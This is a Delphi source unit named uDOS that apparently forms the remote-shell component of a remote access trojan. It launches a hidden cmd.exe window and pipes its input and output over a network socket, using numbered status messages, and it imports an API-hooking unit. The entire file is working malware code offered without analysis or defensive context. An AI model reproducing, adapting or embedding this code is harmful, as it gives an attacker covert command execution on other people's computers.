unit uDOS;

interface
uses windows,MagicApiHooks,Classes,winsock;

type
  TAs = Record
  sSock:    Integer;
  End;
  PTAS = ^TAs;

type
  TDOS = class
  private
    sIDs:cardinal;
  public
    sActive :Boolean;
    procedure WriteData(sStr:string);
    procedure TerminateIt;
    procedure StartThread(sSock:integer);
  end;
var
  DOS: TDOS;
  Cmdbuffer:Tmemorystream;
  G          :TAs;
implementation
Function RemoveIt(sStr:string):string;
var
  hStr:string;
begin
  hstr := sstr;
  repeat
    delete(hStr,pos(#0,hStr),1);
  until pos(#0,hStr) = 0;
  result := hstr;
end;
procedure doFoo(const a: Array  of Byte; out  s: String);
begin
  setLength(s, length(a));
  if length(a) > 0 then
  begin
    move(a[0], s[1], length(a));
  end;
end;

procedure ShellThread(ps:pointer);stdcall;
const
  MAX_CHUNK: dword = 8191;
var
  hiRead, hoRead, hiWrite, hoWrite: THandle;
  Buffer: array [0..8191] of byte;
  SecurityAttributes: SECURITY_ATTRIBUTES;
  StartupInfo: TSTARTUPINFO;
  ProcessInfo: TProcessInformation;
  BytesRead, BytesWritten, ExitCode, PipeMode: dword;
  ReplyStream: TMemoryStream;
  s:char;
  P:string;
  t:string;
begin
  p := '201|4' + #10;
  send(ptas(ps)^.sSock,p[1],length(p),0);
  SecurityAttributes.nLength := SizeOf(SECURITY_ATTRIBUTES);
  SecurityAttributes.lpSecurityDescriptor := nil;
  SecurityAttributes.bInheritHandle := True;
  CreatePipe(hiRead, hiWrite, @SecurityAttributes, 0);
  CreatePipe(hoRead, hoWrite, @SecurityAttributes, 0);
  GetStartupInfo(StartupInfo);
  StartupInfo.hStdOutput := hoWrite;
  StartupInfo.hStdError := hoWrite;
  StartupInfo.hStdInput := hiRead;
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
  StartupInfo.wShowWindow := SW_HIDE;
  CreateProcess(nil, 'cmd', nil, nil, True, CREATE_NEW_CONSOLE, nil, nil, StartupInfo, ProcessInfo);
  CloseHandle(hoWrite);
  CloseHandle(hiRead);
  PipeMode := PIPE_NOWAIT;
  SetNamedPipeHandleState(hoRead, PipeMode , nil, nil);
  while 1 = 1 do
  begin
    Sleep(100);
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode <> STILL_ACTIVE then Break;
    ReadFile(hoRead, Buffer, MAX_CHUNK, BytesRead, nil);
    if BytesRead > 0 then
    begin
      doFoo(buffer,p);
      setlength(p,bytesread);
      repeat
      p[pos(#10,p)] := #222;
      until pos(#10,p) = 0;
      p := '200|' + p + #10;
      send(ptas(ps)^.sSock,p[1],length(p),0);
      zeromemory(@buffer,sizeof(buffer));
    end;
    Sleep(100);
    try
      if CmdBuffer.Size > 0 then
      begin
        WriteFile(hiWrite, CmdBuffer.Memory^, CmdBuffer.Size, BytesWritten, nil);
      end;
    finally
      CmdBuffer.Clear;
    end;
  end;
  GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
  if ExitCode = STILL_ACTIVE then TerminateProcess(ProcessInfo.hProcess, 0);
  CloseHandle(hoRead);
  CloseHandle(hiWrite);
  p := '202|a' + #10;
  send(ptas(ps)^.sSock,p[1],length(p),0);
  //CmdBuffer.Free;
end;
procedure TDOS.StartThread(sSock:integer);
begin
  g.sSock := ssock;
  CmdBuffer := TMemorystream.Create;
  cmdbuffer.Clear;
  createthread(nil,0,@shellthread,@g,0,sIDs);
end;
procedure TDOS.TerminateIt;
var
  p:cardinal;
begin
  //p := Openthread(open
end;
procedure TDOS.WriteData(sStr:string);
begin
  if cmdbuffer = nil then exit;
  cmdbuffer.Clear;
  cmdbuffer.Write(sStr[1],length(sStr));
end;
end.
